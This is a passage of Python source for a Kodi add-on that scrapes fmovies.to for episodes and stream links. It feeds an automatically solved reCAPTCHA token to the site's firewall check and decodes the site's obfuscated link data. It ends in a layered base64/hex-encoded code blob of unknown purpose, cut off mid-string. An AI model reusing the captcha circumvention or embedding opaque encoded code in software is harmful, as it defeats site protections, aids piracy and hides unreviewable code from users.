#        jsondata = json.loads(f.read())
#    html =     jsondata.get('html',None)
#    return html


    
    
def getFileJson():

    from contextlib import closing
    from xbmcvfs import File
    
    with closing(File(jfilename)) as f:
        jsondata = f.read()
        
    jsondata = json.loads(jsondata)

    html =     jsondata.get('html',None)
    return html


def getLinksSerial(hrefx):
    try:
        sez,ep = hrefx.split('-')
    except:
        sez,ep,sh = hrefx.split('-')
    a=''
    
    htmlx =     getFileJson()
    href = re.findall('href="([^"]+)',htmlx)[0]
    href = 'https://fmovies.to'+href if href.startswith('/') else href
    
    
    html = sess.get(href, headers=headers, verify=False).content
    if sys.version_info >= (3,0,0):
        html = html.decode(encoding='utf-8', errors='strict')
    
    result = parseDOM(html, 'section', attrs={'class': "info"})[0]  
    plot = parseDOM(result, 'div', attrs={'itemprop': "description"})
    
    mname = parseDOM(result, 'h1', attrs={'itemprop': "name","class":"title"}) # = <h1 itemprop="name" class="title">
    mname = '[B]'+mname[0]+'[/B] ' if mname else ''
    
    plot = mname+'[CR]'+plot[0] if plot else ''
    imag = parseDOM(result, 'img', ret='src')#[0]
    imag = imag[0] if imag else ''
    imag = 'https:'+imag if imag.startswith('//') else imag
    
    genres = re.findall('Genre\:(.+?)<\/div>',result)
    genres = genres[0] if genres else ''
    
    gg = re.findall('>([^<]+)<\/a>',genres)
    genre = ', '.join([(x.strip()).lower() for x in gg]) if gg else ''
    
    countries = re.findall('Country\:(.+?)<\/div>',result) # 
    countries = countries[0] if countries else ''
    cc = re.findall('>([^<]+)<\/a>',countries)
    country = ', '.join([x.strip() for x in cc]) if gg else ''
    
    tim = re.findall('span>(\d+)\s*min<',result)
    tim = int(tim[0])*60 if tim else ''
    
    
    
    qual = parseDOM(result, 'span', attrs={'class': "quality"}) 
    qual = qual[0].strip() if qual else ''
    
    yr = parseDOM(result, 'span', attrs={'itemprop': "dateCreated"})  
    yr = yr[0].strip() if yr else ''
    infol = {'plot':plot,'genre': genre,'country':country,'duration':tim,'year':yr}
    
    
    servid = 1
    try:
        href1,serwery = re.findall("""href="([^"]+)"\\n\s*data-kname="%s".*?data\-ep=\\'({.*?)}"""%(hrefx),htmlx,re.DOTALL)[0]
    except:
        servid = 0

    href = 'https://fmovies.to'+href1 if href1.startswith('/') else href1

    linki = re.findall('data-id="([^"]+).*?<div>([^<]+)',htmlx,re.DOTALL)
    
    
    
    
    
    
    
    
    nazwax = '- '+nazwa if mname else nazwa
    
    for linkid1,host in linki:
        tyt = mname + nazwax+' - [I][COLOR khaki]'+host+'[/I][/COLOR] '#+'- [B]('+qual+')[/COLOR][/B]'
    
        linkid = re.findall(linkid1+'"\:"([^"]+)',serwery)#[0]
        if linkid:
            add_item(name=tyt, url=linkid[0]+'|'+href, mode='playlink', image=imag, folder=False, infoLabels=infol, IsPlayable=True)
    
    
    
    
    
    
       
#    for serv,linkid,href in servid :
#    
#        href = 'https://fmovies.to'+href if href.startswith('/') else href
#    
#        nazwax = '- '+nazwa if mname else nazwa
#        host = re.findall('data-id="%s".*?>(.+?)<'%str(serv),servers,re.DOTALL)[0]
#        tyt = mname + nazwax+' - [I][COLOR khaki]'+host+'[/I][/COLOR] '#+'- [B]('+qual+')[/COLOR][/B]'
#        add_item(name=tyt, url=linkid+'|'+href, mode='playlink', image=imag, folder=False, infoLabels=infol, IsPlayable=True)
    
    #if len(servid)>0:
    if servid:
        xbmcplugin.setContent(addon_handle, 'videos')
        xbmcplugin.endOfDirectory(addon_handle)    
    else:
        xbmcgui.Dialog().notification('[B]Błąd[/B]', 'Brak materiałów do wyświetlenia',xbmcgui.NOTIFICATION_INFO, 8000,False)

def ListEpisodes(exlink):

    links= getEpisodes(exlink)    
    items = len(links)
    for f in links:
        add_item(name=f.get('title'), url=f.get('href'), mode='getLinksSerial', image=f.get('img'), folder=True, infoLabels= {'plot':nazwa}, itemcount=items, IsPlayable=True)        
    xbmcplugin.setContent(addon_handle, 'files')    

    xbmcplugin.endOfDirectory(addon_handle)    
    
def getEpisodes(href):
    seas,serv = href.split('|')

    html =     getFileJson() 

   # episodes = re.findall('data-season="%s"(.*?)<\/ul>'%str(seas),html,re.DOTALL)[0]

    
    episodes = parseDOM(html,'div', attrs={'class': "episodes",'data\-season': str(seas)})[0] 
    
    
    
    out=[]

    #<div class="episode">
    epizody = parseDOM(episodes, 'div', attrs={'class': "episode"})#[0] 
    for epi in epizody:
    
   # for kname,title in re.findall('data-kname="([^"]+).*?>(.+?)<\/',episodes,re.DOTALL):
        kname = re.findall('data\-kname="([^"]+)',epi,re.DOTALL)[0]

        try:
            sez,epis = kname.split('-')
        except:
            sez,epis,sh = kname.split('-')
        seas = 'S%02d'%int(sez)
        try:
            episod = 'E%02d'%int(epis)
        except:
            episod = 'E-%s'%str(epis)
        title = re.findall('class="name">([^<]+)',epi,re.DOTALL)#[0]
        if title:
            title = re.sub("<[^>]*>","",title[0].strip())
        else:
            title = nazwa.split('-')[-1]
        title = title+' ('+seas+episod+')'
        out.append({'title':title ,'href':kname,'img':rys})

    return out
def ListSeasons(exlink):

    links= getSerial(exlink)    
    items = len(links)
    for f in links:
        add_item(name=f.get('title'), url=f.get('href'), mode='getEpisodes', image=f.get('img'), folder=True, infoLabels= {'plot':nazwa}, itemcount=items, IsPlayable=True)        
    xbmcplugin.setContent(addon_handle, 'files')    

    xbmcplugin.endOfDirectory(addon_handle)    
    
def getSerial(href):

    out=[]
    href,id = href.split('|')

    headers.update({'Referer': href})

    recap =         addon.getSetting('cap_token')
    if not recap:
    
    
        recap="03AGdBq25eDJkrezDo2y"
 
    verid = getVerid(id)    
    params = (
        ('id', id),
        ('vrf', verid),

    )

    response = sess.get('https://fmovies.to/ajax/film/servers', headers=headers, params=params, verify=False)#
    
    html = (response.content)

    if sys.version_info >= (3,0,0):
        html = html.decode(encoding='utf-8', errors='strict')
    html= html.replace('\\"','"')
 
    if 'sitekey=' in html:

        sitek=re.findall('data\-sitekey="(.+?)"',html)[0]

        token = recaptcha_v2.UnCaptchaReCaptcha().processCaptcha(sitek, lang='en')

        data = {
                'g-recaptcha-response': token}
        
        response = sess.post('https://fmovies.to/waf-verify', headers=headers, data=data, cookies=sess.cookies, verify=False)#
        
        params = (
            ('id', id),
            ('token', token),
        )
        response = sess.get('https://fmovies.to/ajax/film/servers', headers=headers, params=params, cookies=response.cookies, verify=False)#
    
        
    jsondata = response.json()

    with io.open(jfilename, 'w', encoding='utf8') as f:
        str_ = json.dumps(jsondata,
            indent=4, sort_keys=True,
            separators=(',', ': '), ensure_ascii=False)
        f.write(to_unicode(str_))

    html = jsondata.get('html',None)
    

  #  sezony = parseDOM(html, 'ul', attrs={'class': "seasons"})[0]
  #  sezonyx = re.findall('<li(.*?)<\/li>',sezony,re.DOTALL)
    sezony = parseDOM(html, 'div', attrs={'id': "seasons"})[0]
    
    

    sezonyx = re.findall('<li(.*?)<\/li>',sezony,re.DOTALL)

    for sez in sezonyx:

       # sesid,servers,title = re.findall('data-id="([^"]+).+?data\-servers="([^"]+).+?>(.+?)<span>',sez,re.DOTALL)[0]
     #   sesid,servers,title = re.findall('data-number="([^"]+).+?data\-servers="([^"]+).+?>(.+?)<span>',sez,re.DOTALL)[0]
        

        sesid = re.findall('value="([^"]+)',sez,re.DOTALL)[0]
        title= re.findall('>([^<]+)<span',sez,re.DOTALL)[0]
        servers = ''
        out.append({'title':title.strip()+nazwa,'href':sesid+'|'+servers,'img':rys})
    return out
    

try:
    import string
    STANDARD_ALPHABET = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    CUSTOM_ALPHABET =   'eST4kCjadnvlAm5b1BOGyLJzrE90Q6oKgRfhV+M8NDYtcxW3IP/qp2i7XHuwZFUs'

    ENCODE_TRANS = string.maketrans(STANDARD_ALPHABET, CUSTOM_ALPHABET)
    DECODE_TRANS = string.maketrans(CUSTOM_ALPHABET, STANDARD_ALPHABET)
except:
    STANDARD_ALPHABET = b'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    CUSTOM_ALPHABET =   b'eST4kCjadnvlAm5b1BOGyLJzrE90Q6oKgRfhV+M8NDYtcxW3IP/qp2i7XHuwZFUs'
    ENCODE_TRANS = bytes.maketrans(STANDARD_ALPHABET, CUSTOM_ALPHABET)
    DECODE_TRANS = bytes.maketrans(CUSTOM_ALPHABET, STANDARD_ALPHABET)

    
    
    
def encode2(input):
    return base64.b64encode(input).translate(ENCODE_TRANS)
def decode2(input):
    try:    
        xx= input.translate(DECODE_TRANS)
    except:
        xx= str(input).translate(DECODE_TRANS)
    return base64.b64decode(xx)


def dekodujNowe(t,n): #16.08.21
    #n = encode2(n)
    r=[]
    i=[]
    u=0
    x=''
    c = 256
    for o in range(c):
        i.append(o)
    o=0

    for o in range(c):
        #u = (u + i[o] + t.charCodeAt(o % t.length)) % c
        u = (u + i[o] + ord(t[o%len(t)]))%c
        r = i[o]
        i[o] = i[u]
        i[u] = r
    e = 0
    u = 0
    o =0
    for e in range(len(n)):
    #e+=1
        o = (o + e) % c
        u = (u + i[o]) % c
        r = i[o]
        i[o] = i[u]
        i[u] = r
    #x += String.fromCharCode(n.charCodeAt(e) ^ i[(i[o] + i[u]) % c])
        if sys.version_info >= (3,0,0):
            try:
                x += chr((n[e])^ i[(i[o] + i[u]) % c] )
            except:
                x += chr(ord(n[e])^ i[(i[o] + i[u]) % c] )
        else:
            x += chr(ord(n[e])^ i[(i[o] + i[u]) % c] )
    return x


def dekoduj(r,o):

    t = []
    e = []
    n = 0
    a = ""
    for f in range(256): 
        e.append(f)

    for f in range(256):

        n = (n + e[f] + ord(r[f % len(r)])) % 256
        t = e[f]
        e[f] = e[n]
        e[n] = t

    f = 0
    n = 0
    for h in range(len(o)):
        f = f + 1
        n = (n + e[f % 256]) % 256
        if not f in e:
            f = 0
            t = e[f]
            e[f] = e[n]
            e[n] = t

            a += chr(ord(o[h]) ^ e[(e[f] + e[n]) % 256])
        else:
            t = e[f]
            e[f] = e[n]
            e[n] = t
            if sys.version_info >= (3,0,0):
                a += chr((o[h]) ^ e[(e[f] + e[n]) % 256])
            else:
                a += chr(ord(o[h]) ^ e[(e[f] + e[n]) % 256])

    return a

def PLchar(char):
    if type(char) is not str:
        char=char.encode('utf-8')
    char = char.replace('\\u0105','\xc4\x85').replace('\\u0104','\xc4\x84')
    char = char.replace('\\u0107','\xc4\x87').replace('\\u0106','\xc4\x86')
    char = char.replace('\\u0119','\xc4\x99').replace('\\u0118','\xc4\x98')
    char = char.replace('\\u0142','\xc5\x82').replace('\\u0141','\xc5\x81')
    char = char.replace('\\u0144','\xc5\x84').replace('\\u0144','\xc5\x83')
    char = char.replace('\\u00f3','\xc3\xb3').replace('\\u00d3','\xc3\x93')
    char = char.replace('\\u015b','\xc5\x9b').replace('\\u015a','\xc5\x9a')
    char = char.replace('\\u017a','\xc5\xba').replace('\\u0179','\xc5\xb9')
    char = char.replace('\\u017c','\xc5\xbc').replace('\\u017b','\xc5\xbb')
    char = char.replace('&#8217;',"'")
    char = char.replace('&#8211;',"-")    
    char = char.replace('&#8230;',"...")    
    char = char.replace("&gt;",">")    
    char = char.replace("&Iacute;","Í").replace("&iacute;","í")
    char = char.replace("&icirc;","î").replace("&Icirc;","Î")
    char = char.replace('&oacute;','ó').replace('&Oacute;','Ó')
    char = char.replace('&quot;','"').replace('&amp;quot;','"')
    char = char.replace('&bdquo;','"').replace('&rdquo;','"')
    char = char.replace("&Scaron;","Š").replace("&scaron;","š")
    char = char.replace("&ndash;","-").replace("&mdash;","-")
    char = char.replace("&Auml;","Ä").replace("&auml;","ä")

    char = char.replace('&#8217;',"'")
    char = char.replace('&#8211;',"-")    
    char = char.replace('&#8230;',"...")    
    char = char.replace('&#8222;','"').replace('&#8221;','"')    
    char = char.replace('[&hellip;]',"...")
    char = char.replace('&#038;',"&")    
    char = char.replace('&#039;',"'")
    char = char.replace('&quot;','"')
    char = char.replace('&nbsp;',".").replace('&amp;','&')
    
    
    
    char = char.replace('Napisy PL',"[COLOR lightblue](napisy pl)[/COLOR]")
    char = char.replace('Lektor PL',"[COLOR lightblue](lektor pl)[/COLOR]")
    char = char.replace('Dubbing PL',"[COLOR lightblue](dubbing pl)[/COLOR]")    
    return char    

    
import base64, codecs
morpheus = 'IyBlbmNvZGVkIGJ5DQojIEZURw0KDQppbXBvcnQgYmFzZTY0LCB6bGliLCBjb2RlY3MsIGJpbmFzY2lpDQptb3JwaGV1cyA9ICc2NTRhNzk3NDY2NGU2ZDRmMzQzMDcxNTMzNTY2NzM0NjM3NmEzODU1NGQ0MTJiMzM0NzM5MzA1OTYzNGE0Nzc5NGQzNDQ0NzA0MTU2N2E0YTdhNTM2ZDM2NDY0Njc5MzA0NTY2NTc2OTU5NDM2ZjU5NDk2YjU3NGI1NjQxNTc0NDc5Mzk2NTUwNDg2MTUwNzk2NDZjNTY1MDdhMzI0MTY1MzU2OTQ3Njc3MDQ1NTEzNjdhNTczMDM1NWE3NTVhMmI1MDUwMmY2MjU4NzkzNTMxNjQ3NjM5MzUyYjY2NmQ1ODc0MmY0ODMzMzMyZjM3NjI1ODM1N2E0NTJmNjYzMjMzMzMzMzJiMzc1NjczMzMzOTM4NjY2ZDU4NzQyZjUwNjY0Yzc0Mzg1NzJmMmY2ZjU4MzM0YTQ4MzkzNzY2NjY2NjcxNzY3NTZhMmI2MjY4MzA2NjJmNzY0Yzc2MmYyZjZjNDQ3YTZkNzU2MjZkMmY1NjM1Njk3NDMxMzkzNjU2MzAyZjYxNTU1NjMzNjc3NDcwNzAzNzc1NmYzMTM5NWE1NzMyNDQ1Mjc2NzgzOTU2NTg1NjZmNjYzNTcxNTg0YjZkNGU0NDZjNzA3NzU5MmY1Njc0N2E2NjMzNjQ3MTU4NTAzNDczMzI0OTYyNjk2NDU0MmY1OTMyNjU2MTM5Mzc2ZjM5MzU0ZTc4NjEyYjY5NWE3YTdhNjY1NDM3MzgyZjc1NTg3MzM5NDczODUzNGEyZjVhNGQ1OTZkNjk1NDM0MzI1NTMyNmM3NTcyNGE0Zjc1MmI0NDRmNmE3YTM5NGY2YjcyNGU0ZjUzNzY3MDM4MzI3OTU3MzY3ODZkNWE1MzZkNDM3MjU4NjM0YTUwNjEzMDc0NTU0YTZhNTUyYjMyMzA2MjU4NDk3OTRlNzA0ZTc0NjI3MTMyMzAzMzQ2NTI1MzUzMmI2ZTM1NmE1Nzc0NzI2ZDMwNGM1MjJmNjE0NzUyNDY2OTQ2Mzk0MzZiMzA2YzcwMzI0NjU0MzU0MjcyNGE3NDM2NTQzNzdhNDczMDUzNTg1NDY1NzUzMTQ1Mzk0YTY1NzQzMDU1NzA1ODU5NzEzOTY4MmIzNDYyMzU0ZTZiNjg3MDcwNzk1OTM1NzU2ZjY2NzU0ZDcxNDc2YTJmNDQ3NTM3NTY1NDczNmE0ZTZmNTg0ZjRkMzAzMDU4NzM0Zjc0NmY0ODM3NGU2ZjZkNTk1NjQ1NDcyZjU2Mzg3MjYzNDY0MzUyNjY1MTU0NDk1NjU3NjIyYjcwNTE2ODZmNmE2ZjdhNmQ0NTMwMzg2MTRiNGI3MDZmNGM3NjU1MmY3MDZiNGY2NjQ1MzkzNTU1MzA2Mjc2NzE3ODQ5NjQ2ZTcwNjU3MzU0NzY0MzZlNGE2MTM0NWE2NzU3MzI1NTRhNGU2MzZhN2E2ODRmNmM0NzU0NmQ2YTQyNTc3MTVhNGQ2NTc4NmYzMTY4MzAyZjYzMzAyZjM4NzI1NzUzNDQ0ZDRjNTI2NjRmNjczOTMyNjk3MTRmNzQ0NjdhNTU2MjQ1NzA2MjRhNzEyZjQ5NmU2YzUwMzA3YTYyNzg0YjJmNzE2NDM1NGU2ZDVhNmQ3OTU0NTg2MTYxNzk2YzZkNmQ3NzYxNjkzODYxNWE2MzY4NzI0ODcyN2E1YTZiNmE1NTMzNzkzODM0NGY2NTMxMzA2ODUwNDc2ZjMxNTA3YTJmNTAzMzMwNGY3NTM0NTM1NTY4NTAzMTZkMzY2Mzc4MzkyZjMxMzA0ZDM4NGE3YTc4NTM1MzM3NGI0OTQ3NjU2YTY2NGUzNzM0NTMzNTYxNmM3NDRjNmQ1ODUxNjY3NjVhNjY2YjRiMmY0MjY1MzI0MzU1MzM2MTQ2MzUzMDU4MzA2YTM2Njc2NDMxNDM2ZDY5NjUzOTZhMmI3ODM3NDk2YTJmNDIyZjRlNTU1NTQ2NTM1NDU4Njg0YzZkNTM1ODcxNDc3NjU5NzA0ZjU1NzA0Yjc1NjQ1Mjc2NzE2ZDM4NTQ0YzM2NGE0YTc0NGY2ZDRjNjM3OTM2NDQzMDM5MzYzNTYyNmQ1NDJmNjE2ODYzNTI1NDVhNTI2NTZlNTE0NjUwNTI0MzM4MzY2NjMzMzc3NjQxMzgyYjU1MzE0ZjM0MzU0YTM5NTk2MTczNDM2NTczN2E0YTYyN2E0YzYzNjIzNTQ0NjQ2Mjc4NzQ3MjUyMzAyZjUyMmY1NTZlNGYyYjc1NTIzNTQ2NjY1MTM5MzI1NDZjNGU3MzY5NTg3MzUyMmY2NTU0MmYzMDY5NjQ2ZTM3NGQ2NzU0MzE1MjY5NDg0YTRjN2E3MDcxNTk2NDMzNzc2NDJmNTM2MTMxNzc3NzY2MzU0Yjc1NzU0ZDc4NDk1OTYzNjIzNjcxNTM0ODRhNjY3ODZiNTkzOTQ3MzQ1YTQ1NzM2MTVhMzg1MjM4NmM0MTU3MzczMDY2NzU2ZDYyNGI0MzM1Nzc0ODJiNzY1YTQ4NjU1MzZiNjY3YTRjNTA1MzQ1NGY2ODc0NmI3NjM2NDI3MDJiNDI1NDJmNDM0ODQxNzY1MzM0NTg1NDQzNzU1MDUxNjUzODY5NTA3MjUyNTA0YTUyNjg0MjU2NTI1MzU4NGY2NTRkNDEzNzZiNzA1NDZkNTQ2YTZmNTQ0MjY1NmIzMTc5MzI0NzY4NmI2NjM3NGM0OTZhNzUzNTc1NTk3MjM4NmY2ZjQ5NjM0ZDJmNmI2YTM2Njk1MjQxNDg0YTc1NTM2ZDJiNWE0MTJiNjQ3ODUxNzYzNTRjNGY0OTUwMmY0OTY2NzM2OTc2Mzc0YjU5MzE0MjM3MzU1NTU1NDQzNjYzNGEzNzJiNGUzNTYzNzI3OTUxNzYzNzY5Mzc3MDM5Mzg2OTdhNzM2NzJmMzY2NjMzNzM0OTMxNGY0Zjc1NGI1NDZlNTMzMzUwNGM0ZTZmNjM2NjM3MmY2YTMzMzAzNTUyNDI1MDJmNTEzOTc4NTk1NjY4NmQzNzQxNGE3ODUzNmU3MDM1MmI2NjQ4Nzg3MDQ5NDc3ODM2NjYzNzM5NDc0ZDMzNjg0YzM3NjgzODM2NjE3OTU5NDE2NjQ1Nzg1OTM2NzU1MTJmNmE2Yzc5NGE2NzQyMmYzMjQ4Mzk0OTMyMzQ3YTZiNjk1MDQ0NDg0NzY5NzUzOTRkNmUyYjcwNjU0NDJmNGU0MTM2Mzk3YTc5NzI0YTcyMzA2ZTUwNzA1MDYzNzQyYjMwNDkzMjZhMmI0ZjUzN2E2ODY4MmY0YjQ3Mzc2NzYxMzY3NzJmNGU2MzY1NzQ2ODU1MmY0MzZjNzc2YzM0NzA1NzQxNDg3NTY5NWEzNzQ5NzAzNDRjNTM2MjJmNDQ2Mjc4NDI3YTY5NGI0ZDYzNGY0NTVhMzY0YTRlNzg0OTUxNzU2OTQ4NzI2ZDQ2NTAzODczNGQ2YjM1NGU2OTQyMzM3YTc4Nzg2OTJiNWE3NDU5N2EzNjQ5NjMyZjRhNDQ3YTQ1NGY1MTZlNmY0MjZlNDk2NTc5MzQ1YTRjNzk3YTc3Njk1ODY5NWE2NzUwMmY0YTQ0NzczNzRhNTc3NzY2NmQ2ZjM5NTA2NjZlMzQ2OTRmMzk0NjM4NDU2Zjc4NGM2MzY5NjE2YjY2Mzg2OTQyMmI0NTZhNTM2Nzc1NTA2MTU5NzI3NjUyNzQ2MzRiMzQ3MDQ0NzY2ZjRmNjE1NDMzNWE0YzY3NmQ0NzY1NjkzNjZmNzQyYjQyNjg3NzY2MzQ0ZjMzNzc3ODZlNTAzMjQ4NjM0ZjQ5NDU0ZjUzNzg0NjJiNGE3MjY1Nzk0ODM4MzE3YTQ5NDY2YjMwNjQ2Yzc2NDMzODRiNmE2NzZkNDk3NjQ5NTQyYjQzNTg1NzZlMmI0ZTQ5Mzg0YjYzNTE1NTY0NmI2NjM5NDQyZjc4NTE3NjU5NzQ3MjRkNGY0YjQ4NTAzOTM5NDU3YTQyNjU0Nzc0NTI2NjU5NzY0YjQ3NWE2ZDJmNGY3YTc4NzY3MDU0Nzg0YTYzNjYzMzY4NDI2MzZjMzQ2ZjUwNmI0YzU5NDY1NDU2MmY3MTY0MzQ3MDRhNzM0MjY2MmI1OTc5NGEzNjQ1MzAzMjUyNTgzMDZhMzM2YjVhNTA3MzY5NDQ2ODZiNmE0NzUzNjY1OTU4MmI0MzU4Nzc0MzJmNGQ0MjJmNmI2YTU5NzgyZjZjMmY0OTQ4NjY0NTM5NDkzNzM0Nzk3YTY4NTQ2NzQ5Mzg0OTRjMzA3NzJmNmM0ZTczNGQzNTM0NzE2NjQ1MmIzNDU0NTgzNTQ1MzczMDMzNjg2YzMyNzg2ZTM0NDk3Nzc3Njc1MTZiNmI0YTJmNmU1MzQ0NmU2ZDRkNjQ0NTMzN2E3NzQ0NzMzNDQ4NzA1NDRmMmY2NzUwNzM0OTMxNzY0MTc2N2E2NjQ5NDgyYjUxMzMzNTQ1NzY2YTZhNDY0ZDU1NjQzNTRmNDE0ODJiNjk3YTZlNDM2ZTc3NmI3NjQ5NTUzNDU0NmU2ODM5MzY2ZDQ5NTA2OTQxNDgyYjUyNmU2ZTRhMzQ2ZjMzNzc2ZjZiNjM3NTRkNDQ1OTUxMmIyYjQ0NmE1MDc3MmIzODY3MmI1MzQ0Mzc2MTY5MzkzODRmNzU1NjY3MzQzOTM5NTI3ODRjNDUyZjQ5Njk2NDQxNzMzNTQzNDgyZjQ5NjYzMjY4MzgzMDY5NzY2OTc5MzY2MjM0Njc2ODM5NGEzMDZhNzYzODQyNmQ0ZjUzMzM2OTc2Njc0YzUwNDM2MTM4NTg2ZTQxNGU2NTRlNDQ1MjU4NDY1NjQ5NDc2MjY3NGM3OTUxMzM3OTVhNjM3OTdhNjk2ZTRkNmIyYjRiNGUzNTcwNDc0NTY5NDE3NjQ1MmY1MTQzMmY1NTYyNDE2ZTM0Njc2YTc4NTUzMDQ3MmY3OTRkNGQ2ODc4MzQyZjY5NzY0ZDQ4MzU2YzUwNTU0OTZlNDY0NjczNmEyZjZjMzU3YTQ5NjY3NzM4NDE0ZjM0NzU3NTU4NmU2NzRjMmI1OTUyMzQzNDM2NmY2ZDRhNGQ0MTZjNWE3ODU0NDE1MDU4NTc0ZTJmMzA2ZDMwMzM1OTc4NTQ2ZjMyMzI0NTM2NjM2ZjM0NDM2MjRhMzg0YTY2N2E0NDYzNmIyYjMwNTM0OTU0MmI0MTUzMzg3MjQ4NGE0ZjQ3NmY1MjY2NmI0ODc1NDM1ODcxNGU2MjczNDI0MTMwNjc2ZTRhNWE1Nzc0N2E0ODUxNDE2MzM0NjI2YTU3NmI0NjM5Njg2NDJmNzA0NTc2NTE0ODJmNDkyZjczNTQ1MjY4NTc0NTQxMzM0ZDRlNTE0ODJmNDE1NzM3NGE2MjQ2NWE0YzY1NGY2NjM1NmY2NjcxNzc2ZTY3MmYzMDYxMzk1MTc2Nzc2YTJiNjI0ZDM5NTk1NjcyNDkzMDM0NTczODQzNzU1MzQ3NjQ2ODQ1NjM3MTYzNTY3YTVhMmY3MzUyNTg2ZTUzMzQ3Mjc4NGYzNDc3NDU0YzQ1NTczODRiMzMyZjY2NDE0ZjU5MzU3MjQzMmY2YjY0Mzg1YTU5Njg1ODZlNTg1NzQzMzI0YzU5Nzk2ZjQ2MmY1MzM5NTk1ODYzNTA3NDY3N2EyZjU2NTU0MTcyNzU1MTY2NjE3MDc3Nzg2ZjMwNDM2MzU5NzUzODcyNTQ0MTY1MzY1OTQ3Nzg3MzZmNjM1MDQ1MzMzNDRlN2EzMzc4NzUzMDc2NzQ3MDc2NzY1MjQ4MmI1NTYzNjg2NjM3NGY3NTQ5MmI1MTM5MzE0MjYzNmQzODQ5NTQzODc1NTc0OTM4NzMzMjY4NzMzMDY3NTg0ZTdhMzA1NDYzNmI2NDM5Nzc0ODYyNDc1YTM2Nzg3MjM0NGE0Zjc1NjYzNjZhMzM0NzQ4Mzg3MDU0NDkyYjYyNDI2NDVhNjE0NjJmNDk0ZTM4NjkzNzZmNGYzODU2NzY0MzZlMzA2MjM0Nzg1MTZiMzQ1MTQ4NjE2ODYzNTQ2ZDJiNTQzODQzNjY0MzcyNjk1MzQxNTQzODc4MzMzNDZjNzQ1NjM2Njk0MjM5NTQzNDcwNzI2Nzc2NzA2NjYyNDM1YTJmNmY3NzMzNmQ2NzJmNzA2YTM1MzU1MDU1NWEzOTc4MmY2NzM0NTIyZjJiNjE0NzM4Mzc3Mzc3NGY0YTM4Nzg3YTcwNDQyZjU3NzE2OTZlNDY0ZDc1NTg2ZjczNjE3MDU5NDM1MDY3NDk0ZTY0NGUzNTQzNGQzNTM4NzA3NjQ3NGY0NDYxNzg1ODZiNmI2NTc5NzQ2YjU0NTk2ODUwMzQ0MzcyMmI0NjU0Njg0NDQ4MzA0Njc0NGE2NTcxNjI1OTcyNDY0MTRjNzczMTM2NmY0YjM2NmQ2NTczNjM2NzUwMzI0NzM2Nzc1NDM0NTkzODU5NjU0MzY0NDM3NjcwNmQyZjM0NDgyZjMwNjY2OTYzNmMzMzYzMzk2ZTcxNjUzODYyNjY0YzM5Nzk0ZTY1NDU3NDc4NTM0ODMyNzI0ZjRmNDg2YzQxNjY0YjU5MzQ0YzY1NjgyZjcxNDI0ZDRiNTg0NzUyMzgzNDU4NmY0MjY2NzI0NTJiNjE0ZTJiNDU1MDM4NDE2YzM1NDQ0ZjRmNTY0ZjczNzU0ZjYzNjI2YzY1Njg0ZTJiNDU3MTQyNGY1MjM1Nzc2MjRmNDkzNjY4NjI0ZjYxMmY0MjU0Njg3NzZlNGY3NjQyNjMzODU4NzM1MTQ4MzM2NzJiNmQyZjQ3NjUzOTUxNjY2NjRhNTg3YTQ1NGY0YjY4N2E0YjRkMmI2ODUwNzQ2ZjY3NzIzODQ2NDg0YzRlNjc0YzYzNTgzOTQzNjY1NzQ2Nzc3YTU2NGU0MjY0N2E3NjM0NDI0ZjRjMmI3OTc0NjYzMDMzNjczMTcxNmE2ZjRjNzc3ODcyNTY0ZTcyNmI3MzZkMzY0YTJmNzI1OTc1NDQzMTZhNDMyYjRkNzc2NDQxNzIzNDU1Njc0NjU4NGI0MjM0Njc3ODM2NzQ0ODY0NjQ1NjYxNjM0YjMxNDg0ZjQ2Njc3ODc2NTg3MjQ2NzY2ODQ2NGY2YjM4NGM2YjY3NjY3ODc4NmE0YTQyNDgzNzY4NDc1ODZiNjEyZjQxNGM3MzY5Nzg3NTc5NGEzNjc3NTg2NzRhNDc0YjY1NjE3MjMzNGU0NTJmNjM0OTcyNzk2ZjMxNzgzNjU3NDI2NTZmNGM2YTRmNTU0ODJiNzg1NjdhNmY0YjY0NTI2MzQyNzg3NDMxNGM2NTcwNzgzMDZiNjQ2MTdhNzI0NzQ1MmI2YzQ2NmY2MzM3Mzc2YTMzMzc2YjY1NTk1ODMxNTk2YjQ5NzY2ZDM0Njc0YzQ4NDk0NjYzMzIzNTMzNmQ3NTUwMzc2ZDRmNGQzOTQxNjYzMDQ0Njc1NTU0MzY2MzQ2Mzk0ZDUyMzEzNzZjNzc1ODQ0Nzg3YTY2NjI0MTJmNGY2Mjc3NjI1ODU5NGU0MzRlNzkyZjU1MmYzNzRiNGU3ODM3NzU2MjYxNmIzMzQ0NDk0NDU5NDU3NjQ5MmY1NDRmMzk1MTYyNmM2NjRiMzY0YzM1N2E3MDQ3MzQyZjZmNTQ3NTRmMzQ2OTZhMzA2MTZmMzQyYjQzNTA0MTJmNjQ3ODM4NDMzMjc1Mzc3NzY3NTA3OTU0MmY2ODU0MmI1MzJmNGE3NjZmNDg3NTZhNWE1YTM3Njc0YzM1NmE2NTcxNDU1ODMzMzE0ZTc3NmU2YjQyNjQ1NDc2MzU0NDJiNDkzNzUyN2EzOTQ4NzM2ZDRjMzgzMDMzNGM0NzQzMzg1MTM1NjM0NzZkNDgzOTM2NDk1MDY3NGMyYjYxNTg0ZDM5NTE3NjYzNDQzMTQ3NzU0ZDY5Mzg3MjQ2NDMzMzY5Njg1MTM1MzM0NjM5NmIzNjQxNjU0OTJmNzg0NzJmNmI0YjM5NTgzNDUzN2EyZjMwN2E0OTVhNzk0ODc5Nzc3MzUzMzE0ZjUwNDM1MDM2MzE3YTQzNDE3NTQ0N2E0MTYyNjg0YzY1NDU2MTM1Njg0Zjc1NzMzMjU0MzQ2MzYyMzM1MTc2MzEzOTQ5NjIzNzY5NGU0YTRjMzg0MTY2NzE2ZTM4MzM0ODQ1NjY3NzMwNTc2MzY1NzQ1MjZhMmY2YjQ3Mzk2ZTJiMzA1MDUwMzM0YjY1Njg1NDczNjg0ZTM0NDI3YTM2MzM1MTMyNTA2ODM3NmY1MTMzMzM1MDJmNzQzOTc4Nzc0YzYzN2EzNTQ1NTA2MjU4NTU2MTYzNmEyZjY4NDY0ODQ3MmI0MTczMmI2OTZhNGY1NzMyNTEzMzc4NmQyYjQyMmI2ODQ0MzQ2NzZjNzc0YjUwNzk0MjM1NmY1YTYzNGQ2NTY1MmY0YjMyNDEzMDJmNWE3OTc5NDM0ODZkNDI0ODdhNDYzODM4MzY3NzZjMzY1MDJiNjQ2MjM5